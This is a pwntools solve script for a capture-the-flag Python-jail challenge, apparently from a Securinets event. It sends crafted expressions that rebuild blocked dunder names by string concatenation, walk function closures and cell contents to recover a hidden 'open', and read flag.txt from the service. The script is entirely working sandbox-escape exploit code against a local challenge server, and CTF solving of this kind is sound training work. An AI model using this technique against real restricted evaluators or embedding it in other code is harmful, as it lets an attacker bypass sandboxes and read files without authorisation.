#!/usr/bin/env python3

from pwn import *


context.log_level = "error"

p = process(["python3", "-u", "chall.py"]) if args.LOCAL else remote("127.0.0.1", 9040)

save_closure = "(a:=pull(mark+mark+'clo'+'sure'+mark+mark)(judge))"
save_memory = "(b:=pull('cell'+mark+'contents')(a[False]))"
indexes = ["False", "True", "True+True", "True+True+True"]

p.sendlineafter(b"> ", save_closure.encode())
p.sendlineafter(b"> ", save_memory.encode())
p.recvuntil(b"> ")

for index in indexes:
    empty_rules = "pull(mark+mark+'im'+'ul'+mark+mark)(b[%s])(False)" % index
    p.sendline(empty_rules.encode())
    answer = p.recvuntil(b"> ")
    if b"archive[" in answer:
        break

p.sendline(b"archive.__defaults__")
p.recvuntil(b"> ")

open_slot = None
for slot in range(3):
    inspect = "archive.__defaults__[%d].__closure__[0].cell_contents" % slot
    p.sendline(inspect.encode())
    answer = p.recvuntil(b"> ")
    if b"function open" in answer:
        open_slot = slot

assert open_slot is not None

upload = (
    'archive.__defaults__[%d].__closure__[0].cell_contents("flag.txt").read()'
    % open_slot
)
p.sendline(upload.encode())

p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
